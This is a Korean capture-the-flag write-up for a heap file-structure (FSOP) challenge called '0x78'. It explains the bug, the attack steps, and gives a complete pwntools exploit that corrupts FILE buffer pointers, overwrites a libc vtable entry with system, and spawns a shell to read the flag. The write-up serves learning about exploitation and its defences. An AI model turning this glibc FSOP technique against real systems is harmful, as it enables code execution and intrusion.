# 0x78

## 문제 설명


Oh the joys of file structs...


## 풀이

### 분석

먼저 바이너리 정보를 확인하면 PIE가 켜져 있고, Canary는 없으며, NX가 활성화되어 있다.

```bash
$ file Ox78
Ox78: ELF 64-bit LSB pie executable, x86-64, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, not stripped

$ checksec --file Ox78
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
SHSTK:    Enabled
IBT:      Enabled
Stripped: No
```

함수 흐름을 보면 `main()`에서 `Ox78()` 함수가 호출된다. `Ox78()` 함수는 `/tmp/test.txt`를 열어 `FILE *fp`를 만든 뒤, `fp` 주소와 libc leak을 출력해준다.

```c
fp = fopen("/tmp/test.txt", "r");
printf("Here's the address of the File Structure: %p\n", fp);
printf("... libc leak as well: %p\n", puts_got_value());
read(0, fp, 0x78);
prevent_fsop();
fread(testbuf, 1, 0x78, fp);
prevent_fsop();
```

중요한 부분은 `read(0, fp, 0x78)`이다. 사용자의 입력을 `FILE` 구조체가 있는 heap 영역에 그대로 써버리기 때문에, `_IO_FILE` 구조체의 일부 필드를 조작할 수 있다.

이후 `prevent_fsop()` 함수가 호출된다.

```c
void prevent_fsop() {
    old_wide_data = fp->_wide_data;
    old_vtable = fp->vtable;

    if (old_wide_data != fp->_wide_data || old_vtable != fp->vtable) {
        *(int *)0 = 1;
    }

    fp->_chain = 0;
}
```

이 함수는 FSOP를 막기 위해 `_wide_data`와 `vtable`이 변조되었는지만 검사한다. 하지만 `read()`로 덮는 크기가 `0x78`이기 때문에 `vtable` 위치인 `fp + 0xd8`까지는 직접 덮지 못한다. 대신 `_IO_buf_base`, `_IO_buf_end` 같은 앞쪽 필드들은 조작할 수 있다.

### 취약점

취약점은 `FILE *fp` 자체를 사용자 입력으로 덮는 데 있다.

```c
read(0, fp, 0x78);
```

이로 인해 `_IO_FILE` 구조체의 버퍼 관련 필드를 조작할 수 있다. 이후 호출되는 `fread(testbuf, 1, 0x78, fp)`는 조작된 `FILE` 구조체를 기준으로 동작한다.

공격 흐름은 다음과 같다.

1. 프로그램이 `FILE *fp` 주소를 출력한다.
2. 프로그램이 `puts` 주소를 leak 해준다.
3. `puts` leak을 이용해 libc base를 계산한다.
4. `read(0, fp, 0x78)`에서 `FILE` 구조체의 `_IO_buf_base`, `_IO_buf_end`를 조작한다.
5. `fread()`가 stdin에서 추가 데이터를 읽어 조작한 libc 영역에 쓰게 만든다.
6. `_IO_file_jumps + 0x58` 위치의 함수 포인터를 `system`으로 바꾼다.
7. 프로그램 종료 시 `_IO_cleanup` 흐름에서 조작된 함수 포인터가 호출되면서 `system(fp)`가 실행된다.

여기서 `fp`의 앞부분은 `_flags` 필드이므로 완전히 `/bin/sh` 문자열로 만들 수는 없다. 대신 앞쪽의 이상한 바이트는 무시되도록 하고 뒤에 `;sh\x00`을 붙여 shell command injection처럼 처리되게 한다.

```text
[이상한 바이트들];sh\x00
```

`system()` 입장에서는 앞의 이상한 명령은 실패하지만, 세미콜론 뒤의 `sh`가 실행된다.

### 익스플로잇


익스플로잇 코드는 다음과 같다.


```python
#!/usr/bin/env python3
from pwn import *
import os

HOST = "tjc.tf"
PORT = 31378

BIN = "./Ox78" if os.path.exists("./Ox78") else "./0x78"
LD = "./ld-linux-x86-64.so.2"
LIBC_PATH = "./libc.so.6"

context.arch = "amd64"
context.log_level = "info"

libc = ELF(LIBC_PATH, checksec=False)

PUTS_OFF = libc.sym["puts"]
SYSTEM_OFF = libc.sym["system"]
IO_FILE_JUMPS = libc.sym["_IO_file_jumps"]

VTABLE_TARGET_OFF = IO_FILE_JUMPS + 0x58
WRITE_SIZE = 0x80


def make_stage2(libc_base):
    raw = libc.read(VTABLE_TARGET_OFF, WRITE_SIZE)

    stage2 = b""
    for i in range(0, WRITE_SIZE, 8):
        val = u64(raw[i:i + 8])
        if val != 0:
            val += libc_base
        stage2 += p64(val)

    stage2 = p64(libc_base + SYSTEM_OFF) + stage2[8:]
    return stage2


def start():
    if args.REMOTE:
        return remote(HOST, PORT)

    with open("/tmp/test.txt", "wb") as f:
        f.write(b"test file")

    return process([LD, "--library-path", ".", BIN])


io = start()

io.recvuntil(b"File Structure: 0x")
fp = int(io.recvline().strip(), 16)

io.recvuntil(b"libc leak as well: ")
libc_leak = int(io.recvline().strip(), 16)
libc_base = libc_leak - PUTS_OFF

log.info(f"fp        = {hex(fp)}")
log.info(f"libc leak = {hex(libc_leak)}")
log.info(f"libc base = {hex(libc_base)}")

target = libc_base + VTABLE_TARGET_OFF
stage2 = make_stage2(libc_base)

payload = p32(0xfbad2488) + b";sh\x00"

payload += p64(0)                  # _IO_read_ptr
payload += p64(0)                  # _IO_read_end
payload += p64(0)                  # _IO_read_base

payload += p64(0)                  # _IO_write_base
payload += p64(1)                  # _IO_write_ptr
payload += p64(0)                  # _IO_write_end

payload += p64(target)             # _IO_buf_base
payload += p64(target + WRITE_SIZE)# _IO_buf_end

payload += p64(0)                  # _IO_save_base
payload += p64(0)                  # _IO_backup_base
payload += p64(0)                  # _IO_save_end
payload += p64(0)                  # _markers

payload += p64(0)                  # _chain
payload += p32(0)                  # _fileno = stdin
payload += p32(0)                  # _flags2

assert len(payload) == 0x78

io.send(payload + stage2 + b"cat /app/flag.txt 2>/dev/null; cat flag.txt 2>/dev/null; exit\n")
io.interactive()
```

## 배운 점

이 문제를 통해 FSOP 방어를 단순히 `_wide_data`와 `vtable` 변조 여부만 확인하는 방식으로 구현하면 충분하지 않다는 것을 확인할 수 있었다. 직접 `vtable`을 덮지 않더라도 `_IO_FILE` 구조체의 버퍼 관련 필드를 조작하면, 이후 `fread()` 같은 libc 내부 동작을 이용해 원하는 주소에 데이터를 쓸 수 있다.

또한 glibc 2.34 환경에서는 전통적인 hook overwrite가 막혀 있더라도, `_IO_file_jumps`와 같은 libc 내부 구조를 이해하면 다른 방식으로 제어 흐름을 바꿀 수 있다. 이번 문제에서는 libc leak이 제공되었기 때문에 libc base 계산이 쉬웠고, `FILE` 구조체 주소까지 제공되어 FSOP 흐름을 구성할 수 있었다.
